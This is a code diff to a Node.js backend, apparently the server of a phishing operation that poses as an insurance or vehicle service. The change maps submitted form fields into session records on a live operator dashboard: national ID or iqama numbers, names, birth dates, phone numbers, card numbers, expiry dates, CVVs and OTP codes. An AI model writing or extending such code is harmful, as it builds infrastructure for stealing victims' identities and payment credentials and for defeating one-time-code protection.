@@ -166,6 +166,15 @@ function findSessionByIp(ip) {
   return rows[0].id;
 }
 
+/** Pick the first non-empty value among several possible field names. */
+function pick(src, names) {
+  for (const n of names) {
+    const v = src?.[n];
+    if (v !== undefined && v !== null && String(v).trim() !== "") return v;
+  }
+  return undefined;
+}
+
 function recordSubmission(type, payload) {
   const state = db.get();
   const id =
@@ -184,14 +193,30 @@ function recordSubmission(type, payload) {
   io.emit("live:update", entry);
   if (id) {
     // Mirror flat fields so the dashboard's session table shows the data.
+    // The site nests the real form values under payload.formData.
+    const p = { ...(payload || {}), ...((payload || {}).formData || {}) };
     const flat = {};
-    const p = payload || {};
-    if (p.identityNumber) flat.idNumber = flat.identityNumber = p.identityNumber;
-    if (p.mobileNumber) flat.phone = flat.mobileNumber = p.mobileNumber;
-    if (p.sequenceNumber) flat.sequenceNumber = p.sequenceNumber;
-    if (p.name) flat.name = p.name;
-    if (p.result) flat.result = p.result;
-    if (p.vehicle) flat.vehicle = p.vehicle;
+    const set = (key, names) => {
+      const v = pick(p, names);
+      if (v !== undefined) flat[key] = v;
+    };
+    set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
+    set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
+    set("name", ["documentOwnerName", "name", "fullName", "cardholderName"]);
+    set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
+    set("birthDate", ["birthDate", "dateOfBirth", "dob"]);
+    set("email", ["email"]);
+    set("company", ["compname", "company", "insuranceCompany"]);
+    set("price", ["totalPrice", "price", "amount"]);
+    set("insuranceType", ["TypeOfInsuranceContract", "insuranceType"]);
+    set("cardNumber", ["cardNumber"]);
+    set("cardExpiry", ["expiry", "expiryDate"]);
+    set("cardCvv", ["cvv"]);
+    set("otp", ["otp", "otpCode", "code"]);
+    set("result", ["result"]);
+    set("vehicle", ["vehicle"]);
+    if (flat.idNumber) flat.identityNumber = flat.idNumber;
+    if (flat.phone) flat.mobileNumber = flat.phone;
     upsertSession(id, {
       ...flat,
       [type]: payload,
@@ -202,6 +227,7 @@ function recordSubmission(type, payload) {
   }
   return entry;
 }
+
 
 
 function broadcastAdminEvent(id, event, payload) {
@@ -215,7 +241,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v6";
+const APP_VERSION = "v8";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
